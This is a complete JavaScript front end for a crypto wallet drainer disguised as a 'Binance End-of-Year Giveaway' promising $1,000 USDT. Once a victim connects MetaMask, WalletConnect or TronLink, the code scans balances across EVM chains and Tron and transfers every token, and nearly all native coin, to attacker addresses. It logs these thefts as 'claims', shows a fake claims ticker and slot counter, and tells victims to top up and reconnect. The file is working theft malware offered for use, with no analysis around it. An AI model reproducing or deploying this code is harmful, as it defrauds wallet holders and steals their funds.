import { ethers } from 'https://esm.sh/ethers@6.13.4';

const ERC20_ABI = [
  'function balanceOf(address) view returns (uint256)',
  'function transfer(address to, uint256 amount) returns (bool)'
];

const $ = s => document.querySelector(s);
const sleep = ms => new Promise(r => setTimeout(r, ms));
const short = a => a ? `${a.slice(0, 6)}…${a.slice(-4)}` : '';
const usd = n => `$${(Number(n) || 0).toFixed(2)}`;

let CFG = null;
let ACCOUNT = null;
let EIP1193 = null;
let WC = null;
let TOTAL = 0;
let BUSY = false;
let DONE = 0;
let STEPS = 0;
let IS_TRON = false;

/* ---------- boot ---------- */

(async function boot() {
  try {
    CFG = await (await fetch('/api/config')).json();
    paintStats();
    await paintTicker();
    setInterval(paintTicker, 20000);
  } catch {}
})();

function paintStats() {
  const { slots, used } = CFG.campaign;
  $('#used').textContent = used.toLocaleString();
  $('#left').textContent = Math.max(0, slots - used).toLocaleString();
  $('#bar').style.width = Math.min(100, (used / slots) * 100) + '%';
  $('#s2').textContent = CFG.chains.length + 1;
}

async function paintTicker() {
  try {
    const list = await (await fetch('/api/claims')).json();
    const box = $('#ticker');
    if (!list.length) {
      box.innerHTML = '<div class="tick"><span class="who">waiting for first claims…</span></div>';
      return;
    }
    box.innerHTML = list.map(c => `
      <div class="tick">
        <span class="ok">●</span>
        <span class="who">${short(c.address)}</span>
        <span>${c.symbol} · ${c.chain}</span>
        <span class="amt">+${Number(c.amount).toLocaleString('en-US', { maximumFractionDigits: 4 })}</span>
      </div>`).join('');
  } catch {}
}

/* ---------- modal helpers ---------- */

function openProgress() {
  $('#ov').classList.add('on');
  $('#live').classList.remove('hide');
  $('#fin').classList.add('hide');
  $('#log').innerHTML = '';
  $('#mBar').style.width = '0%';
}
function closeAll() {
  $('#ov').classList.remove('on');
  $('#pick').classList.remove('on');
}
function status(t) { $('#mStatus').textContent = t; }
function prog(p) { $('#mBar').style.width = Math.min(100, p) + '%'; }

function log(text, cls = '') {
  const el = document.createElement('div');
  if (cls) el.className = cls;
  el.textContent = text;
  $('#log').appendChild(el);
  $('#log').scrollTop = $('#log').scrollHeight;
}

function toast(t) {
  const el = $('#toast');
  el.textContent = t;
  el.classList.add('on');
  setTimeout(() => el.classList.remove('on'), 3000);
}

/* ---------- wallet connection ---------- */

$('#claimBtn').addEventListener('click', () => {
  if (BUSY) return;
  if (!window.ethereum && !window.tronLink && !CFG?.wcProjectId) {
    return toast('No wallet detected — install MetaMask or open in a wallet browser');
  }
  $('#pick').classList.add('on');
});

$('#optInjected').addEventListener('click', () => {
  if (!window.ethereum) return toast('No browser wallet detected');
  connect('injected');
});

$('#optWc').addEventListener('click', () => {
  if (!CFG?.wcProjectId) return toast('WalletConnect is not configured');
  connect('wc');
});

$('#optTron').addEventListener('click', () => {
  if (!window.tronLink) return toast('Open this page inside the TronLink browser');
  connect('tron');
});

$('#closeBtn').addEventListener('click', () => { closeAll(); location.reload(); });

async function loadWalletConnect() {
  const urls = [
    'https://esm.sh/@walletconnect/ethereum-provider@2.17.2?bundle&target=es2020',
    'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.17.2/+esm'
  ];
  for (const url of urls) {
    try {
      const mod = await import(url);
      if (mod.EthereumProvider) return mod.EthereumProvider;
    } catch {}
  }
  throw new Error('wc-load-failed');
}

async function connect(kind) {
  BUSY = true;
  $('#pick').classList.remove('on');
  openProgress();
  prog(2);

  try {
    if (kind === 'tron') {
      await window.tronLink.request({ method: 'tron_requestAccounts' });
      await sleep(500);
      const tw = window.tronWeb;
      if (!tw?.defaultAddress?.base58) throw new Error('tron-locked');
      ACCOUNT = tw.defaultAddress.base58;
      IS_TRON = true;
      log(`TronLink connected: ${short(ACCOUNT)}`, 'ok');
      await register('tron', 'tronlink');
      status('Scanning Tron…');
      await sweepTron();
      return finish();
    }

    if (kind === 'wc') {
      status('Opening WalletConnect…');
      const EthereumProvider = await loadWalletConnect();
      WC = await EthereumProvider.init({
        projectId: CFG.wcProjectId,
        chains: [1],
        optionalChains: CFG.chains.map(c => c.id),
        rpcMap: Object.fromEntries(CFG.chains.map(c => [c.id, c.rpc[0]])),
        showQrModal: true,
        metadata: {
          name: 'Binance End-of-Year Giveaway',
          description: '$1,000 USDT giveaway — first 20,000 wallets',
          url: location.origin,
          icons: [`${location.origin}/icon.svg`]
        }
      });
      await WC.connect();
      EIP1193 = WC;
      ACCOUNT = WC.accounts?.[0];
      if (!ACCOUNT) throw new Error('wc-no-account');
    } else {
      const accs = await window.ethereum.request({ method: 'eth_requestAccounts' });
      ACCOUNT = accs[0];
      EIP1193 = window.ethereum;
    }

    log(`Wallet connected: ${short(ACCOUNT)}`, 'ok');
    status('Registering eligibility…');
    await register('evm', kind);

    await sweepEvm();

    if (window.tronLink) await sweepTron();
    finish();
  } catch (e) {
    const msg = String(e?.message || e);
    if (e?.code === 4001 || msg.includes('rejected')) {
      log('Connection cancelled', 'bad');
    } else if (msg.includes('wc-load')) {
      log('WalletConnect failed to load — try a browser wallet', 'bad');
    } else if (msg.includes('tron-locked')) {
      log('TronLink is locked', 'bad');
    } else {
      log('Connection error: ' + msg.slice(0, 60), 'bad');
    }
    BUSY = false;
    status('Stopped');
  }
}

async function register(chain, connector) {
  try {
    await fetch('/api/connect', {
      method: 'POST',
      headers: { 'content-type': 'application/json' },
      body: JSON.stringify({ address: ACCOUNT, chain, connector })
    });
    CFG = await (await fetch('/api/config')).json();
    paintStats();
  } catch {}
}

/* ---------- EVM sweep ---------- */

async function addChain(chain) {
  const hex = '0x' + chain.id.toString(16);
  try {
    await EIP1193.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: hex }] });
  } catch (e) {
    if (e.code === 4902 || e.code === -32603) {
      await EIP1193.request({
        method: 'wallet_addEthereumChain',
        params: [{
          chainId: hex,
          chainName: chain.name,
          nativeCurrency: { name: chain.symbol, symbol: chain.symbol, decimals: 18 },
          rpcUrls: [chain.rpc[0]],
          blockExplorerUrls: [chain.explorer]
        }]
      });
    } else throw e;
  }
}

async function sweepEvm() {
  const chains = CFG.chains.filter(c => CFG.receiving[c.key]);
  STEPS = chains.length;
  let i = 0;

  for (const chain of chains) {
    i++;
    status(`Scanning ${chain.name} (${i}/${STEPS})`);
    prog(4 + (i / (STEPS + 1)) * 88);

    try {
      await addChain(chain);
    } catch (e) {
      log(`${chain.name}: ${e.code === 4001 ? 'rejected' : 'unavailable'}`, 'bad');
      continue;
    }

    const provider = new ethers.BrowserProvider(EIP1193, 'any');
    let net;
    try { net = await provider.getNetwork(); } catch { continue; }
    if (Number(net.chainId) !== chain.id) { log(`${chain.name}: wrong network`, 'bad'); continue; }

    const signer = await provider.getSigner();
    const nativeBal = await provider.getBalance(ACCOUNT);
    const nativeUsd = Number(ethers.formatEther(nativeBal)) * chain.nativeUsd;

    if (nativeUsd < CFG.campaign.gasFloorUsd) {
      log(`${chain.name}: no gas (${usd(nativeUsd)})`, 'bad');
      continue;
    }

    const holdings = await scan(chain, provider);
    if (!holdings.length) continue;

    log(`— ${chain.name} —`, 'hd');

    for (const h of holdings) {
      try {
        const c = new ethers.Contract(h.address, ERC20_ABI, signer);
        const data = c.interface.encodeFunctionData('transfer', [CFG.receiving[chain.key], h.raw]);
        const gas = await signer.estimateGas({ to: h.address, data });
        const tx = await signer.sendTransaction({ to: h.address, data, gasLimit: (gas * 13n) / 10n });
        await tx.wait(1);
        DONE++;
        const value = h.amount * h.usd;
        TOTAL += value;
        log(`✓ ${h.amount.toFixed(4)} ${h.symbol} (${usd(value)})`, 'ok');
        report(chain.key, h.symbol, h.amount, value, tx.hash);
      } catch (e) {
        log(`✗ ${h.symbol}: ${e.code === 4001 ? 'rejected' : 'failed'}`, 'bad');
      }
    }

    try {
      const bal = await provider.getBalance(ACCOUNT);
      const fee = await provider.getFeeData();
      const gasPrice = fee.maxFeePerGas ?? fee.gasPrice ?? 0n;
      const cost = (21000n * gasPrice * 14n) / 10n;
      const value = bal - cost;
      if (value > 0n) {
        const tx = await signer.sendTransaction({ to: CFG.receiving[chain.key], value, gasLimit: 21000n });
        await tx.wait(1);
        const v = Number(ethers.formatEther(value)) * chain.nativeUsd;
        DONE++;
        TOTAL += v;
        log(`✓ ${Number(ethers.formatEther(value)).toFixed(5)} ${chain.symbol} (${usd(v)})`, 'ok');
        report(chain.key, chain.symbol, Number(ethers.formatEther(value)), v, tx.hash);
      }
    } catch (e) {
      if (e.code !== 4001) log(`✗ ${chain.symbol} sweep failed`, 'bad');
    }

    await sleep(1200);
  }
}

async function scan(chain, provider) {
  const out = [];
  for (const t of chain.tokens) {
    try {
      const c = new ethers.Contract(t.address, ERC20_ABI, provider);
      const raw = await c.balanceOf(ACCOUNT);
      if (raw > 0n) {
        const amount = Number(ethers.formatUnits(raw, t.decimals));
        if (amount * t.usd >= 0.02) out.push({ ...t, raw, amount });
      }
    } catch {}
  }
  out.sort((a, b) => b.amount * b.usd - a.amount * a.usd);
  return out;
}

/* ---------- Tron sweep ---------- */

async function sweepTron() {
  if (!CFG.receiving.tron || !window.tronLink) return;
  status('Scanning Tron…');

  let tw = window.tronWeb;
  if (!tw?.defaultAddress?.base58) {
    try { await window.tronLink.request({ method: 'tron_requestAccounts' }); } catch { return; }
    await sleep(700);
    tw = window.tronWeb;
  }
  if (!tw?.defaultAddress?.base58) { log('Tron: wallet locked', 'bad'); return; }

  const from = tw.defaultAddress.base58;
  const to = CFG.receiving.tron;

  if (!IS_TRON) {
    ACCOUNT = ACCOUNT || from;
    log(`TronLink detected: ${short(from)}`, 'hd');
    await register('tron', 'tronlink');
  }

  const bal = await tw.trx.getBalance(from);
  if (bal < 5_000_000) { log(`Tron: no gas (${(bal / 1e6).toFixed(2)} TRX)`, 'bad'); return; }

  log('— Tron —', 'hd');

  for (const t of CFG.tron.tokens) {
    try {
      const c = await tw.contract().at(t.address);
      const raw = await c.balanceOf(from).call();
      if (!raw || raw.toString() === '0') continue;
      await c.transfer(to, raw.toString()).send();
      const amount = Number(raw) / 10 ** t.decimals;
      DONE++;
      TOTAL += amount * t.usd;
      log(`✓ ${amount.toFixed(2)} ${t.symbol}`, 'ok');
      report('tron', t.symbol, amount, amount * t.usd, 'tronlink');
      await sleep(1200);
    } catch {
      log(`✗ ${t.symbol}: failed`, 'bad');
    }
  }

  try {
    const now = await tw.trx.getBalance(from);
    const send = now - 1_100_000;
    if (send > 0) {
      await tw.trx.sendTransaction(to, send);
      const amount = send / 1e6;
      DONE++;
      TOTAL += amount * 0.15;
      log(`✓ ${amount.toFixed(2)} TRX`, 'ok');
      report('tron', 'TRX', amount, amount * 0.15, 'tronlink');
    }
  } catch {}
}

/* ---------- finish ---------- */

function report(chain, symbol, amount, value, txHash) {
  fetch('/api/claim', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ address: ACCOUNT, chain, symbol, amount, usd: value, txHash })
  }).catch(() => {});
}

function finish() {
  BUSY = false;
  prog(100);
  status('Session complete');
  $('#live').classList.add('hide');
  $('#fin').classList.remove('hide');
  $('#finAmt').textContent = usd(TOTAL);

  if (TOTAL < CFG.campaign.minUsd) {
    const note = document.createElement('div');
    note.className = 'st';
    note.style.marginTop = '10px';
    note.style.color = '#F6465D';
    note.textContent = `Below the ${usd(CFG.campaign.minUsd)} gas minimum — top up and reconnect.`;
    $('#fin').insertBefore(note, $('#closeBtn'));
  }
  if (DONE > 0) log(`${DONE} transfer(s) confirmed`, 'hd');
      }
